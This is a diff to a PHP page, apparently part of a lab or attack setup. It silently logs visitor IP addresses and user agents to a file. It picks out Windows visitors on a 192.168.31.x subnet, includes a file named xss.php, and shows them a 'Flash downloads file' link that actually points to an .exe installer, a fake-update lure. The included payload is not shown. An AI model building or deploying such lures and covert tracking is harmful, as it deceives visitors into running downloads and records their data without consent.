@@ -1,7 +1,14 @@
 <?php
+ini_set('date.timezone','Asia/Shanghai');
 $clientip = $_SERVER['REMOTE_ADDR'];
-echo $clientip;
-echo "<br>";
+//echo $clientip;
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$currenttime = date("Y-m-d h:i:s a l");
+//echo "<br>";
+$myfile=fopen("ip_log.txt","a");
+$log = $currenttime  . "  " . $clientip .  "   " . $agent . "\r";
+fwrite($myfile, $log);
+fclose($myfile);
 $ip_start = get_iplong('192.168.31.1');
 $ip_end = get_iplong('192.168.31.255');
 $ip = get_iplong($clientip);
@@ -9,8 +16,8 @@ $ip = get_iplong($clientip);
 if($ip>=$ip_start && $ip <=$ip_end)
 {
 	$agent = $_SERVER['HTTP_USER_AGENT'];
-	echo "$agent";
-	echo "<br>";
+	//echo "$agent";
+	//echo "<br>";
 	if(preg_match('/Windows NT/',$agent))
 	{
 		$os = "Windows";
@@ -25,6 +32,8 @@ if($ip>=$ip_start && $ip <=$ip_end)
 			{				
 				include './xss.php';
 				echo "<br />";
+				echo "<br>";
+				echo "<br>";
 				echo "<h1>if don't downlaod,please downloads file:</h1>";
 				echo "<p>";
 				echo "<a href='https://download-ssl.firefox.com.cn/releases-sha2/stub/official/zh-CN/Firefox-latest.exe' ><p>Flash     downloads     file</p></a>";
